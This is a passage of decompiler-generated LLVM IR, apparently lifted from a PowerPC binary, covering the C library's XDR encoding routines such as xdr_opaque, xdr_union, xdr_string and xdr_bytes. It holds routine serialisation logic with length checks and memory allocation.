  %v1_100136c0 = inttoptr i32 %v0_100136c0 to i32*
  %v2_100136c0 = load i32, i32* %v1_100136c0, align 4
  %v3_100136c4 = icmp eq i32 %v2_100136c0, 1
  br i1 %v3_100136c4, label %dec_label_pc_10013708, label %dec_label_pc_100136d0

dec_label_pc_100136d0:                            ; preds = %entry
  %v1_100136c8 = icmp eq i32 %v2_100136c0, 0
  br i1 %v1_100136c8, label %dec_label_pc_100136e4, label %dec_label_pc_100136d8

dec_label_pc_100136d8:                            ; preds = %dec_label_pc_100136d0
  %v3_100136d0 = icmp eq i32 %v2_100136c0, 2
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_100136d0, label %dec_label_pc_1001373c, label %dec_label_pc_10013738

dec_label_pc_100136e4:                            ; preds = %dec_label_pc_100136d0
  %v1_100136e4 = inttoptr i32 %arg2 to i32*
  %v2_100136e4 = load i32, i32* %v1_100136e4, align 4
  %v1_100136e8 = add i32 %v0_100136c0, 4
  %v2_100136e8 = inttoptr i32 %v1_100136e8 to i32*
  %v3_100136e8 = load i32, i32* %v2_100136e8, align 4
  %v2_100136ec = icmp ne i32 %v2_100136e4, 0
  %v5_100136f0 = zext i1 %v2_100136ec to i32
  store i32 %v5_100136f0, i32* %stack_var_-24, align 4
  %v1_100136f8 = add i32 %v3_100136e8, 4
  %v2_100136f8 = inttoptr i32 %v1_100136f8 to i32*
  %v3_100136f8 = load i32, i32* %v2_100136f8, align 4
  call void @__pseudo_call(i32 %v3_100136f8)
  br label %dec_label_pc_1001373c

dec_label_pc_10013708:                            ; preds = %entry
  %v1_10013708 = add i32 %v0_100136c0, 4
  %v2_10013708 = inttoptr i32 %v1_10013708 to i32*
  %v3_10013708 = load i32, i32* %v2_10013708, align 4
  %v1_1001370c = inttoptr i32 %v3_10013708 to i32*
  %v2_1001370c = load i32, i32* %v1_1001370c, align 4
  call void @__pseudo_call(i32 %v2_1001370c)
  %v0_10013718 = load i32, i32* %r3.global-to-local, align 4
  %v3_10013718 = icmp eq i32 %v0_10013718, 0
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_10013718, label %dec_label_pc_10013738, label %dec_label_pc_10013724

dec_label_pc_10013724:                            ; preds = %dec_label_pc_10013708
  %v3_10013724 = load i32, i32* %stack_var_-24, align 4
  %v2_10013728 = icmp ne i32 %v3_10013724, 0
  %v5_1001372c = zext i1 %v2_10013728 to i32
  %v1_10013730 = load i32, i32* %r31.global-to-local, align 4
  %v2_10013730 = inttoptr i32 %v1_10013730 to i32*
  store i32 %v5_1001372c, i32* %v2_10013730, align 4
  br label %dec_label_pc_1001373c

dec_label_pc_10013738:                            ; preds = %dec_label_pc_100136d8, %dec_label_pc_10013708
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001373c

dec_label_pc_1001373c:                            ; preds = %dec_label_pc_100136d8, %dec_label_pc_10013724, %dec_label_pc_100136e4, %dec_label_pc_10013738
  %v0_1001374c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001374c

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_1001373c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10013738, { 1, 0 }
}

define i32 @xdr_enum() local_unnamed_addr {
entry:
  %v0_10013750 = call i32 @__GI_xdr_long()
  ret i32 %v0_10013750
}

define i32 @xdr_opaque(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10013754 = load i32, i32* @r5, align 4
  %v3_10013754 = icmp eq i32 %v0_10013754, 0
  store i32 %tmp, i32* @r31, align 4
  br i1 %v3_10013754, label %dec_label_pc_10013828, label %dec_label_pc_10013770

dec_label_pc_10013770:                            ; preds = %entry
  %v1_10013770 = urem i32 %v0_10013754, 4
  %v3_10013770 = icmp eq i32 %v1_10013770, 0
  %v1_1001377c = sub nsw i32 4, %v1_10013770
  %.v1_1001377c = select i1 %v3_10013770, i32 0, i32 %v1_1001377c
  store i32 %.v1_1001377c, i32* @r30, align 4
  %v2_10013780 = load i32, i32* %arg1, align 4
  %v3_10013784 = icmp eq i32 %v2_10013780, 1
  br i1 %v3_10013784, label %dec_label_pc_100137a0, label %dec_label_pc_1001378c

dec_label_pc_1001378c:                            ; preds = %dec_label_pc_10013770
  %v1_1001378c = icmp eq i32 %v2_10013780, 0
  br i1 %v1_1001378c, label %dec_label_pc_100137e0, label %dec_label_pc_10013794

dec_label_pc_10013794:                            ; preds = %dec_label_pc_1001378c
  %v3_10013794 = icmp eq i32 %v2_10013780, 2
  br i1 %v3_10013794, label %dec_label_pc_10013828, label %dec_label_pc_10013830

dec_label_pc_100137a0:                            ; preds = %dec_label_pc_10013770
  %v1_100137a0 = add i32 %tmp, 4
  %v2_100137a0 = inttoptr i32 %v1_100137a0 to i32*
  %v3_100137a0 = load i32, i32* %v2_100137a0, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_100137a8 = add i32 %v3_100137a0, 8
  %v2_100137a8 = inttoptr i32 %v1_100137a8 to i32*
  %v3_100137a8 = load i32, i32* %v2_100137a8, align 4
  call void @__pseudo_call(i32 %v3_100137a8)
  %v3_100137b4 = icmp eq i32* %arg1, null
  br i1 %v3_100137b4, label %dec_label_pc_10013830, label %dec_label_pc_100137bc

dec_label_pc_100137bc:                            ; preds = %dec_label_pc_100137a0
  %v0_100137bc = load i32, i32* @r30, align 4
  %v3_100137bc = icmp eq i32 %v0_100137bc, 0
  br i1 %v3_100137bc, label %dec_label_pc_10013828, label %dec_label_pc_100137c4

dec_label_pc_100137c4:                            ; preds = %dec_label_pc_100137bc
  %v0_100137c4 = load i32, i32* @r31, align 4
  %v1_100137c4 = add i32 %v0_100137c4, 4
  %v2_100137c4 = inttoptr i32 %v1_100137c4 to i32*
  %v3_100137c4 = load i32, i32* %v2_100137c4, align 4
  store i32 %v0_100137c4, i32* %r3.global-to-local, align 4
  %v1_100137d4 = add i32 %v3_100137c4, 8
  br label %dec_label_pc_1001381c

dec_label_pc_100137e0:                            ; preds = %dec_label_pc_1001378c
  %v1_100137e0 = add i32 %tmp, 4
  %v2_100137e0 = inttoptr i32 %v1_100137e0 to i32*
  %v3_100137e0 = load i32, i32* %v2_100137e0, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_100137e8 = add i32 %v3_100137e0, 12
  %v2_100137e8 = inttoptr i32 %v1_100137e8 to i32*
  %v3_100137e8 = load i32, i32* %v2_100137e8, align 4
  call void @__pseudo_call(i32 %v3_100137e8)
  %v3_100137f4 = icmp eq i32* %arg1, null
  br i1 %v3_100137f4, label %dec_label_pc_10013830, label %dec_label_pc_100137fc

dec_label_pc_100137fc:                            ; preds = %dec_label_pc_100137e0
  %v0_100137fc = load i32, i32* @r30, align 4
  %v3_100137fc = icmp eq i32 %v0_100137fc, 0
  br i1 %v3_100137fc, label %dec_label_pc_10013828, label %dec_label_pc_10013804

dec_label_pc_10013804:                            ; preds = %dec_label_pc_100137fc
  %v0_10013804 = load i32, i32* @r31, align 4
  %v1_10013804 = add i32 %v0_10013804, 4
  %v2_10013804 = inttoptr i32 %v1_10013804 to i32*
  %v3_10013804 = load i32, i32* %v2_10013804, align 4
  store i32 %v0_10013804, i32* %r3.global-to-local, align 4
  %v1_10013814 = add i32 %v3_10013804, 12
  br label %dec_label_pc_1001381c

dec_label_pc_1001381c:                            ; preds = %dec_label_pc_100137c4, %dec_label_pc_10013804
  %storemerge1.in.in = phi i32 [ %v1_10013814, %dec_label_pc_10013804 ], [ %v1_100137d4, %dec_label_pc_100137c4 ]
  %storemerge1.in = inttoptr i32 %storemerge1.in.in to i32*
  %storemerge1 = load i32, i32* %storemerge1.in, align 4
  call void @__pseudo_call(i32 %storemerge1)
  %v0_10013844.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013834

dec_label_pc_10013828:                            ; preds = %dec_label_pc_10013794, %dec_label_pc_100137fc, %dec_label_pc_100137bc, %entry
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013834

dec_label_pc_10013830:                            ; preds = %dec_label_pc_10013794, %dec_label_pc_100137e0, %dec_label_pc_100137a0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013834

dec_label_pc_10013834:                            ; preds = %dec_label_pc_10013828, %dec_label_pc_1001381c, %dec_label_pc_10013830
  %v0_10013844 = phi i32 [ 1, %dec_label_pc_10013828 ], [ %v0_10013844.pre, %dec_label_pc_1001381c ], [ 0, %dec_label_pc_10013830 ]
  ret i32 %v0_10013844

; uselistorder directives
  uselistorder i32 %v1_10013770, { 1, 0 }
  uselistorder i32 %tmp, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 5, 3, 4, 6, 7, 0 }
  uselistorder i32* null, { 1, 0, 4, 3, 2, 5, 6, 7 }
  uselistorder i32* %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10013834, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10013830, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10013828, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1001381c, { 1, 0 }
}

define i32 @xdr_union(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg4, i32* @r31, align 4
  store i32 %arg5, i32* %r28.global-to-local, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 268515440, i32* @lr, align 4
  %v0_1001386c = call i32 @xdr_enum()
  %v3_10013870 = icmp eq i32 %v0_1001386c, 0
  br i1 %v3_10013870, label %dec_label_pc_100138d4, label %dec_label_pc_10013878

dec_label_pc_10013878:                            ; preds = %entry
  %v0_10013878 = load i32, i32* @r30, align 4
  %v1_10013878 = inttoptr i32 %v0_10013878 to i32*
  %v2_10013878 = load i32, i32* %v1_10013878, align 4
  %v0_10013890.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013890

dec_label_pc_10013880:                            ; preds = %dec_label_pc_10013890
  %v1_10013880 = inttoptr i32 %v0_10013880 to i32*
  %v2_10013880 = load i32, i32* %v1_10013880, align 4
  %v1_10013884 = add i32 %v0_10013880, 8
  %v4_10013888 = icmp eq i32 %v2_10013880, %v2_10013878
  br i1 %v4_10013888, label %dec_label_pc_100138c8.loopexit, label %dec_label_pc_10013890

dec_label_pc_10013890:                            ; preds = %dec_label_pc_10013880, %dec_label_pc_10013878
  %v0_10013880 = phi i32 [ %v1_10013884, %dec_label_pc_10013880 ], [ %v0_10013890.pre, %dec_label_pc_10013878 ]
  %v1_10013890 = add i32 %v0_10013880, 4
  %v2_10013890 = inttoptr i32 %v1_10013890 to i32*
  %v3_10013890 = load i32, i32* %v2_10013890, align 4
  %v3_10013894 = icmp eq i32 %v3_10013890, 0
  br i1 %v3_10013894, label %dec_label_pc_1001389c, label %dec_label_pc_10013880

dec_label_pc_1001389c:                            ; preds = %dec_label_pc_10013890
  %v0_1001389c = load i32, i32* %r28.global-to-local, align 4
  %v3_1001389c = icmp eq i32 %v0_1001389c, 0
  br i1 %v3_1001389c, label %dec_label_pc_100138d4, label %dec_label_pc_100138c8

dec_label_pc_100138c8.loopexit:                   ; preds = %dec_label_pc_10013880
  br label %dec_label_pc_100138c8

dec_label_pc_100138c8:                            ; preds = %dec_label_pc_100138c8.loopexit, %dec_label_pc_1001389c
  %storemerge2 = phi i32 [ %v0_1001389c, %dec_label_pc_1001389c ], [ %v3_10013890, %dec_label_pc_100138c8.loopexit ]
  %storemerge1 = load i32, i32* %r29.global-to-local, align 4
  call void @__pseudo_call(i32 %storemerge2)
  br label %dec_label_pc_100138d8

dec_label_pc_100138d4:                            ; preds = %dec_label_pc_1001389c, %entry
  br label %dec_label_pc_100138d8

dec_label_pc_100138d8:                            ; preds = %dec_label_pc_100138c8, %dec_label_pc_100138d4
  %v0_100138e8 = phi i32 [ %storemerge1, %dec_label_pc_100138c8 ], [ 0, %dec_label_pc_100138d4 ]
  ret i32 %v0_100138e8

; uselistorder directives
  uselistorder i32 %v0_10013880, { 2, 0, 1 }
  uselistorder i32 ()* @xdr_enum, { 4, 5, 1, 3, 6, 2, 0 }
  uselistorder label %dec_label_pc_100138d8, { 1, 0 }
}

define i32 @__GI_xdr_string(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v0_10013900 = load i32, i32* @r4, align 4
  store i32 %v0_10013900, i32* @r29, align 4
  %v0_10013904 = load i32, i32* @r5, align 4
  store i32 %v0_10013904, i32* @r28, align 4
  %v2_10013908 = load i32, i32* %arg1, align 4
  %v1_1001390c = inttoptr i32 %v0_10013900 to i32*
  %v2_1001390c = load i32, i32* %v1_1001390c, align 4
  store i32 %v2_1001390c, i32* @r31, align 4
  %v3_10013910 = icmp eq i32 %v2_10013908, 0
  br i1 %v3_10013910, label %dec_label_pc_10013928, label %dec_label_pc_10013918

dec_label_pc_10013918:                            ; preds = %entry
  %v3_10013918 = icmp eq i32 %v2_10013908, 2
  br i1 %v3_10013918, label %dec_label_pc_10013920, label %dec_label_pc_1001393c

dec_label_pc_10013920:                            ; preds = %dec_label_pc_10013918
  %v3_10013920 = icmp eq i32 %v2_1001390c, 0
  br i1 %v3_10013920, label %dec_label_pc_100139f0, label %dec_label_pc_10013928.thread

dec_label_pc_10013928.thread:                     ; preds = %dec_label_pc_10013920
  br label %dec_label_pc_10013930

dec_label_pc_10013928:                            ; preds = %entry
  %v3_10013928 = icmp eq i32 %v2_1001390c, 0
  br i1 %v3_10013928, label %dec_label_pc_100139f8, label %dec_label_pc_10013930

dec_label_pc_10013930:                            ; preds = %dec_label_pc_10013928.thread, %dec_label_pc_10013928
  store i32 %v2_1001390c, i32* @r3, align 4
  %v0_10013934 = call i32 @__GI_strlen()
  store i32 %v0_10013934, i32* %r3.global-to-local, align 4
  store i32 %v0_10013934, i32* %stack_var_-40, align 4
  %v0_1001393c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001393c

dec_label_pc_1001393c:                            ; preds = %dec_label_pc_10013918, %dec_label_pc_10013930
  %v0_1001393c = phi i32 [ %tmp, %dec_label_pc_10013918 ], [ %v0_1001393c.pre, %dec_label_pc_10013930 ]
  store i32 %v0_1001393c, i32* @r3, align 4
  %v2_10013940 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10013940, i32* @r4, align 4
  store i32 268515656, i32* @lr, align 4
  %v2_10013944 = inttoptr i32 %v0_1001393c to i32*
  %v4_10013944 = call i32 @xdr_u_int(i32* %v2_10013944, i32* nonnull %stack_var_-40)
  store i32 %v4_10013944, i32* %r3.global-to-local, align 4
  %v3_10013948 = icmp eq i32 %v4_10013944, 0
  br i1 %v3_10013948, label %dec_label_pc_100139f8, label %dec_label_pc_10013950

dec_label_pc_10013950:                            ; preds = %dec_label_pc_1001393c
  %v3_10013950 = load i32, i32* %stack_var_-40, align 4
  %v1_10013954 = load i32, i32* @r28, align 4
  %v3_10013954 = icmp ugt i32 %v3_10013950, %v1_10013954
  br i1 %v3_10013954, label %dec_label_pc_100139f8, label %dec_label_pc_1001395c

dec_label_pc_1001395c:                            ; preds = %dec_label_pc_10013950
  %v0_1001395c = load i32, i32* @r30, align 4
  %v1_1001395c = inttoptr i32 %v0_1001395c to i32*
  %v2_1001395c = load i32, i32* %v1_1001395c, align 4
  %v3_10013960 = icmp eq i32 %v2_1001395c, 1
  br i1 %v3_10013960, label %dec_label_pc_1001397c, label %dec_label_pc_10013968

dec_label_pc_10013968:                            ; preds = %dec_label_pc_1001395c
  %v1_10013968 = icmp eq i32 %v2_1001395c, 0
  br i1 %v1_10013968, label %dec_label_pc_100139c4, label %dec_label_pc_10013970

dec_label_pc_10013970:                            ; preds = %dec_label_pc_10013968
  %v3_10013970 = icmp eq i32 %v2_1001395c, 2
  br i1 %v3_10013970, label %dec_label_pc_100139d8, label %dec_label_pc_100139f8

dec_label_pc_1001397c:                            ; preds = %dec_label_pc_1001395c
  %v1_1001397c = add i32 %v3_10013950, 1
  store i32 %v1_1001397c, i32* @r3, align 4
  %v4_1001397c = icmp eq i32 %v1_1001397c, 0
  br i1 %v4_1001397c, label %dec_label_pc_100139f0, label %dec_label_pc_10013984

dec_label_pc_10013984:                            ; preds = %dec_label_pc_1001397c
  %v0_10013984 = load i32, i32* @r31, align 4
  %v3_10013984 = icmp eq i32 %v0_10013984, 0
  br i1 %v3_10013984, label %dec_label_pc_10013998, label %dec_label_pc_10013998.thread

dec_label_pc_10013998.thread:                     ; preds = %dec_label_pc_10013984
  br label %dec_label_pc_100139b8

dec_label_pc_10013998:                            ; preds = %dec_label_pc_10013984
  store i32 268515728, i32* @lr, align 4
  %v0_1001398c = call i32 @malloc()
  store i32 %v0_1001398c, i32* %r3.global-to-local, align 4
  %v1_10013990 = load i32, i32* @r29, align 4
  %v2_10013990 = inttoptr i32 %v1_10013990 to i32*
  store i32 %v0_1001398c, i32* %v2_10013990, align 4
  store i32 %v0_1001398c, i32* @r31, align 4
  %v3_10013998 = icmp eq i32 %v0_1001398c, 0
  br i1 %v3_10013998, label %dec_label_pc_100139a0, label %dec_label_pc_10013998.dec_label_pc_100139b8_crit_edge

dec_label_pc_10013998.dec_label_pc_100139b8_crit_edge: ; preds = %dec_label_pc_10013998
  %v3_100139b8.pre = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_100139b8

dec_label_pc_100139a0:                            ; preds = %dec_label_pc_10013998
  %v3_100139a8 = load i32, i32* @global_var_1002ef8c, align 4
  store i32 ptrtoint ([27 x i8]* @global_var_1001a034.529 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100139b4.530 to i32), i32* @lr, align 4
  %v4_100139b0 = call i32 @__GI_fputs(i32 ptrtoint ([27 x i8]* @global_var_1001a034.529 to i32), i32 %v3_100139a8, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  store i32 %v4_100139b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100139f8

dec_label_pc_100139b8:                            ; preds = %dec_label_pc_10013998.dec_label_pc_100139b8_crit_edge, %dec_label_pc_10013998.thread
  %v3_100139b8 = phi i32 [ %v3_10013950, %dec_label_pc_10013998.thread ], [ %v3_100139b8.pre, %dec_label_pc_10013998.dec_label_pc_100139b8_crit_edge ]
  %v1_100139c011 = phi i32 [ %v0_10013984, %dec_label_pc_10013998.thread ], [ %v0_1001398c, %dec_label_pc_10013998.dec_label_pc_100139b8_crit_edge ]
  %v4_100139c0 = add i32 %v3_100139b8, %v1_100139c011
  %v5_100139c0 = inttoptr i32 %v4_100139c0 to i8*
  store i8 0, i8* %v5_100139c0, align 1
  %v3_100139c4.pre = load i32, i32* %stack_var_-40, align 4
  %v0_100139c8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100139c4

dec_label_pc_100139c4:                            ; preds = %dec_label_pc_10013968, %dec_label_pc_100139b8
  %v0_100139c8 = phi i32 [ %v0_1001395c, %dec_label_pc_10013968 ], [ %v0_100139c8.pre, %dec_label_pc_100139b8 ]
  %v3_100139c4 = phi i32 [ %v3_10013950, %dec_label_pc_10013968 ], [ %v3_100139c4.pre, %dec_label_pc_100139b8 ]
  store i32 %v3_100139c4, i32* @r5, align 4
  store i32 %v0_100139c8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100139d4.531 to i32), i32* @lr, align 4
  %v3_100139d0 = inttoptr i32 %v0_100139c8 to i32*
  %v4_100139d0 = call i32 @xdr_opaque(i32* %v3_100139d0)
  store i32 %v4_100139d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100139fc

dec_label_pc_100139d8:                            ; preds = %dec_label_pc_10013970
  %v0_100139d8 = load i32, i32* @r31, align 4
  store i32 %v0_100139d8, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100139e0.532 to i32), i32* @lr, align 4
  %v0_100139dc = call i32 @free()
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_100139e8 = load i32, i32* @r29, align 4
  %v2_100139e8 = inttoptr i32 %v1_100139e8 to i32*
  store i32 0, i32* %v2_100139e8, align 4
  %v0_10013a0c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100139fc

dec_label_pc_100139f0:                            ; preds = %dec_label_pc_1001397c, %dec_label_pc_10013920
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100139fc

dec_label_pc_100139f8:                            ; preds = %dec_label_pc_10013970, %dec_label_pc_10013950, %dec_label_pc_1001393c, %dec_label_pc_10013928, %dec_label_pc_100139a0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100139fc

dec_label_pc_100139fc:                            ; preds = %dec_label_pc_100139f0, %dec_label_pc_100139d8, %dec_label_pc_100139c4, %dec_label_pc_100139f8
  %v0_10013a0c = phi i32 [ 1, %dec_label_pc_100139f0 ], [ %v0_10013a0c.pre, %dec_label_pc_100139d8 ], [ %v4_100139d0, %dec_label_pc_100139c4 ], [ 0, %dec_label_pc_100139f8 ]
  ret i32 %v0_10013a0c

; uselistorder directives
  uselistorder i32 %v0_100139c8, { 1, 0 }
  uselistorder i32 %v0_1001398c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_10013950, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1001393c, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder label %dec_label_pc_100139fc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100139f8, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_100139c4, { 1, 0 }
  uselistorder label %dec_label_pc_1001393c, { 1, 0 }
  uselistorder label %dec_label_pc_10013930, { 1, 0 }
}

define i32 @xdr_wrapstring() local_unnamed_addr {
entry:
  store i32 -1, i32* @r5, align 4
  store i32 268515876, i32* @lr, align 4
  %v2_10013a20 = call i32 @__GI_xdr_string(i32* inttoptr (i32 -1 to i32*))
  %v2_10013a24 = icmp ne i32 %v2_10013a20, 0
  %v5_10013a28 = zext i1 %v2_10013a24 to i32
  ret i32 %v5_10013a28
}

define i32 @xdr_bytes(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_10013a40 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg4, i32* %r28.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  %v1_10013a64 = inttoptr i32 %arg2 to i32*
  %v2_10013a64 = load i32, i32* %v1_10013a64, align 4
  store i32 %v2_10013a64, i32* @r31, align 4
  store i32 268515948, i32* @lr, align 4
  %v2_10013a68 = inttoptr i32 %arg3 to i32*
  %v4_10013a68 = call i32 @xdr_u_int(i32* %v2_10013a68, i32* %v2_10013a68)
  store i32 %v4_10013a68, i32* %r3.global-to-local, align 4
  %v3_10013a6c = icmp eq i32 %v4_10013a68, 0
  br i1 %v3_10013a6c, label %dec_label_pc_10013b2c, label %dec_label_pc_10013a74

dec_label_pc_10013a74:                            ; preds = %entry
  %v0_10013a74 = load i32, i32* @r30, align 4
  %v1_10013a74 = inttoptr i32 %v0_10013a74 to i32*
  %v2_10013a74 = load i32, i32* %v1_10013a74, align 4
  store i32 %v2_10013a74, i32* @r30, align 4
  %v1_10013a78 = load i32, i32* %r28.global-to-local, align 4
  %v3_10013a78 = icmp ugt i32 %v2_10013a74, %v1_10013a78
  %v0_10013a80 = load i32, i32* @r29, align 4
  %v1_10013a80 = inttoptr i32 %v0_10013a80 to i32*
  br i1 %v3_10013a78, label %dec_label_pc_10013a80, label %dec_label_pc_10013a8c

dec_label_pc_10013a80:                            ; preds = %dec_label_pc_10013a74
  %v2_10013a80 = load i32, i32* %v1_10013a80, align 4
  %v3_10013a84 = icmp eq i32 %v2_10013a80, 2
  br i1 %v3_10013a84, label %dec_label_pc_10013a8c, label %dec_label_pc_10013b2c

dec_label_pc_10013a8c:                            ; preds = %dec_label_pc_10013a74, %dec_label_pc_10013a80
  %v2_10013a8c = load i32, i32* %v1_10013a80, align 4
  %v3_10013a90 = icmp eq i32 %v2_10013a8c, 1
  br i1 %v3_10013a90, label %dec_label_pc_10013aac, label %dec_label_pc_10013a98

dec_label_pc_10013a98:                            ; preds = %dec_label_pc_10013a8c
  %v1_10013a98 = icmp eq i32 %v2_10013a8c, 0
  br i1 %v1_10013a98, label %dec_label_pc_10013a98.dec_label_pc_10013aec_crit_edge, label %dec_label_pc_10013aa0

dec_label_pc_10013a98.dec_label_pc_10013aec_crit_edge: ; preds = %dec_label_pc_10013a98
  br label %dec_label_pc_10013aec

dec_label_pc_10013aa0:                            ; preds = %dec_label_pc_10013a98
  %v3_10013aa0 = icmp eq i32 %v2_10013a8c, 2
  br i1 %v3_10013aa0, label %dec_label_pc_10013b0c, label %dec_label_pc_10013b2c

dec_label_pc_10013aac:                            ; preds = %dec_label_pc_10013a8c
  %v3_10013aac = icmp eq i32 %v2_10013a74, 0
  br i1 %v3_10013aac, label %dec_label_pc_10013b34, label %dec_label_pc_10013ab4

dec_label_pc_10013ab4:                            ; preds = %dec_label_pc_10013aac
  %v0_10013ab4 = load i32, i32* @r31, align 4
  %v3_10013ab4 = icmp eq i32 %v0_10013ab4, 0
  br i1 %v3_10013ab4, label %dec_label_pc_10013acc, label %dec_label_pc_10013acc.thread

dec_label_pc_10013acc.thread:                     ; preds = %dec_label_pc_10013ab4
  br label %dec_label_pc_10013aec

dec_label_pc_10013acc:                            ; preds = %dec_label_pc_10013ab4
  store i32 %v2_10013a74, i32* @r3, align 4
  store i32 268516036, i32* @lr, align 4
  %v0_10013ac0 = call i32 @malloc()
  store i32 %v0_10013ac0, i32* %r3.global-to-local, align 4
  %v1_10013ac4 = load i32, i32* @r27, align 4
  %v2_10013ac4 = inttoptr i32 %v1_10013ac4 to i32*
  store i32 %v0_10013ac0, i32* %v2_10013ac4, align 4
  %v3_10013acc = icmp eq i32 %v0_10013ac0, 0
  br i1 %v3_10013acc, label %dec_label_pc_10013ad4, label %dec_label_pc_10013acc.dec_label_pc_10013acc.dec_label_pc_10013aec_crit_edge_crit_edge

dec_label_pc_10013acc.dec_label_pc_10013acc.dec_label_pc_10013aec_crit_edge_crit_edge: ; preds = %dec_label_pc_10013acc
  %v0_10013af0.pre.pre = load i32, i32* @r29, align 4
  %v0_10013af8.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10013aec

dec_label_pc_10013ad4:                            ; preds = %dec_label_pc_10013acc
  %v3_10013adc = load i32, i32* @global_var_1002ef8c, align 4
  store i32 ptrtoint ([26 x i8]* @global_var_1001a050.533 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10013ae8.534 to i32), i32* @lr, align 4
  %v4_10013ae4 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_1001a050.533 to i32), i32 %v3_10013adc, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  store i32 %v4_10013ae4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013b2c

dec_label_pc_10013aec:                            ; preds = %dec_label_pc_10013acc.thread, %dec_label_pc_10013acc.dec_label_pc_10013acc.dec_label_pc_10013aec_crit_edge_crit_edge, %dec_label_pc_10013a98.dec_label_pc_10013aec_crit_edge
  %v0_10013af8 = phi i32 [ %v2_10013a74, %dec_label_pc_10013a98.dec_label_pc_10013aec_crit_edge ], [ %v2_10013a74, %dec_label_pc_10013acc.thread ], [ %v0_10013af8.pre.pre, %dec_label_pc_10013acc.dec_label_pc_10013acc.dec_label_pc_10013aec_crit_edge_crit_edge ]
  %v0_10013af0 = phi i32 [ %v0_10013a80, %dec_label_pc_10013a98.dec_label_pc_10013aec_crit_edge ], [ %v0_10013a80, %dec_label_pc_10013acc.thread ], [ %v0_10013af0.pre.pre, %dec_label_pc_10013acc.dec_label_pc_10013acc.dec_label_pc_10013aec_crit_edge_crit_edge ]
  store i32 %v0_10013af0, i32* %r3.global-to-local, align 4
  store i32 %v0_10013af8, i32* @r5, align 4
  store i32 %v0_10013a40, i32* @lr, align 4
  %v3_10013b08 = inttoptr i32 %v0_10013af0 to i32*
  %v4_10013b08 = call i32 @xdr_opaque(i32* %v3_10013b08)
  store i32 %v4_10013b08, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013b0c

dec_label_pc_10013b0c:                            ; preds = %dec_label_pc_10013aa0, %dec_label_pc_10013aec
  %v0_10013b0c = load i32, i32* @r31, align 4
  %v3_10013b0c = icmp eq i32 %v0_10013b0c, 0
  br i1 %v3_10013b0c, label %dec_label_pc_10013b34, label %dec_label_pc_10013b14

dec_label_pc_10013b14:                            ; preds = %dec_label_pc_10013b0c
  store i32 %v0_10013b0c, i32* @r3, align 4
